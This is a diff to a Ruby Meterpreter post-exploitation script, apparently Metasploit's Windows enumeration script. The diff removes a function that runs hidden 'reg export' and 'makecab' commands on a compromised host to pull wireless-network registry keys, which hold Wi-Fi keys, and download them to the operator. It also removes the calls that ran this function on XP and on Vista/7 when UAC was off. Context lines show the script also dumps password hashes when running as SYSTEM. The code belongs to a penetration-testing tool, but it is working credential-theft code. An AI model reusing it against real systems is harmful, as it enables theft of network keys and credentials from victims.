@@ -512,62 +512,6 @@ def filewrt(file2wrt, data2wrt)
 	output.close
 end
 #-------------------------------------------------------------------------------
-
-# Function for dumping Registry keys that contain wireless configuration settings for Vista and XP 
-# This keys can later be imported into a Windows client for connection or key extraction.
-def dumpwlankeys(pathoflogs,filename)
-	#This variable will only contain garbage, it is to make sure that the channel is not closed while the reg is being dumped and compress
-	garbage = ''
-	windir = @client.fs.file.expand_path("%TEMP%")
-	print_status('Dumping and Downloading the Registry entries for Configured Wireless Networks')
-	xpwlan = "HKLM\\Software\\Microsoft\\WZCSVC\\Parameters\\Interfaces"
-	vswlan = "HKLM\\Software\\Microsoft\\Wlansvc"
-	info = @client.sys.config.sysinfo
-	trgtos = info['OS']
-	if trgtos =~ /(XP)/
-		key = xpwlan
-		present = false
-		if reg_enumkeys("HKLM\\Software\\Microsoft\\WZCSVC\\Parameters").length == 0
-			print_status("\tNo Wireless interfaces are configured on this host!")
-			return
-		end
-	elsif trgtos =~ /(Vista|7)/
-		key = vswlan
-	end
-	begin
-		print_status("\tExporting #{key}")
-		r = @client.sys.process.execute("reg export \"#{key}\" #{windir}\\wlan#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
-		while(d = r.channel.read)
-			garbage << d
-		end
-		sleep(2)
-		r.channel.close
-		r.close
-		print_status("\tCompressing key into cab file for faster download")
-		r = @client.sys.process.execute("cmd.exe /c makecab #{windir}\\wlan#{filename}.reg #{windir}\\wlan#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
-		while(d = r.channel.read)
-			garbage << d
-		end
-		r.channel.close
-		r.close
-	rescue ::Exception => e
-		print_status("Error dumping Registry keys #{e.class} #{e}")
-	end
-
-	#Downloading compressed registry keys
-	
-	begin
-		print_status("\tDownloading wlan#{filename}.cab to -> #{pathoflogs}/wlan#{filename}.cab")
-		@client.fs.file.download_file("#{pathoflogs}/wlan#{filename}.cab", "#{windir}\\wlan#{filename}.cab")
-		#sleep(5)
-	rescue ::Exception => e
-		print_status("Error Downloading Registry keys #{e.class} #{e}")
-	end
-	#Deleting left over files
-	print_status("\tDeleting left over files")
-	#@client.sys.process.execute("cmd.exe /c del #{windir}\\wlan*", nil, {'Hidden' => 'true'})
-
-end
 # Functions Provided by natron (natron 0x40 invisibledenizen 0x2E com)
 # for Process Migration
 #---------------------------------------------------------------------------------------------------------
@@ -686,7 +630,6 @@ if trgtos =~ /(Windows XP)/
 	list_exec(commands)
 	wmicexec(wmic)
 	findprogs()
-	dumpwlankeys(logs,filenameinfo)
 	gethash()
 elsif trgtos =~ /(Windows .NET)/
 	list_exec(commands)
@@ -706,11 +649,6 @@ elsif trgtos =~ /(Vista|7)/
 	list_exec(commands + vstwlancmd)
 	wmicexec(wmic)
 	findprogs()
-	if not uac
-		dumpwlankeys(logs,filenameinfo)
-	else
-		print_status("UAC is enabled, Wireless key Registry could not be dumped under current privileges")
-	end
 	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
 		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista or Windows 7 if not System.")
 	else
